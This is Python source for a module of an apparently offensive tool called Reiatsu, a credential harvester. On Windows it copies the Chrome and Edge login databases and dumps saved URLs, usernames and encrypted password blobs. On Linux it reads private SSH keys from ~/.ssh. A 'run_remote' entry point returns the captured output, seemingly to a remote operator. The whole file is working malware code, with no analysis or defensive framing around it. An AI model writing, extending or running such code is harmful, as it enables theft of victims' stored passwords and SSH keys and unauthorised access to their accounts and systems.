"""
Reiatsu Credential Harvester Module - Browser and SSH credential extraction.
"""
import os
import shutil
import sqlite3
import base64
import platform
import subprocess
import io
import sys

class Creds:
    """Credential Harvester: Extracts credentials from browsers and SSH keys."""
    
    @staticmethod
    def _browser_creds_windows():
        """Extract browser credentials from Windows (Chrome, Edge)."""
        appdata = os.getenv('LOCALAPPDATA', '')
        browser_paths = {
            'Chrome': os.path.join(appdata, 'Google\\Chrome\\User Data\\Default\\Login Data'),
            'Edge': os.path.join(appdata, 'Microsoft\\Edge\\User Data\\Default\\Login Data')
        }
        
        output = ""
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                tmp_db = os.path.join(os.getenv('TEMP'), 'login_data.db')
                try:
                    shutil.copy2(path, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    output += f"[+] Credentials from {browser}:\n"
                    for row in cursor.fetchall():
                        url, user, pwd_encrypted = row
                        if url and user and pwd_encrypted:
                            output += f"  URL: {url}\n  User: {user}\n"
                            output += f"  Encrypted: {base64.b64encode(pwd_encrypted).decode()[:40]}...\n\n"
                    
                    conn.close()
                    os.remove(tmp_db)
                except Exception as e:
                    output += f"[!] Failed to read {browser}: {e}\n"
            else:
                output += f"[-] {browser} data not found.\n"
        return output

    @staticmethod
    def _keychain_linux():
        """Extract SSH keys from Linux."""
        output = ""
        ssh_dir = os.path.expanduser('~/.ssh')
        
        if os.path.exists(ssh_dir):
            output += "[+] Found SSH directory.\n"
            for f in os.listdir(ssh_dir):
                if 'id_' in f and not f.endswith('.pub'):
                    key_path = os.path.join(ssh_dir, f)
                    output += f"  - Private Key: {key_path}\n"
                    try:
                        with open(key_path, 'r') as key_file:
                            output += "    " + key_file.read()[:300].replace('\n', '\n    ') + "...\n"
                    except Exception:
                        output += "    (Could not read key)\n"
        return output
    
    @staticmethod
    def run_remote(args):
        """Main entry point for the credential harvesting module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Running Credential Harvester on {platform.system()}...")
            
            if platform.system() == "Windows":
                print("\n--- Browser Credentials ---")
                print("[!] Passwords require platform-specific decryption.")
                print(Creds._browser_creds_windows())
            elif platform.system() == "Linux":
                print("\n--- SSH Keys ---")
                print(Creds._keychain_linux())
            else:
                print(f"[!] Unsupported OS: {platform.system()}")
                
        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()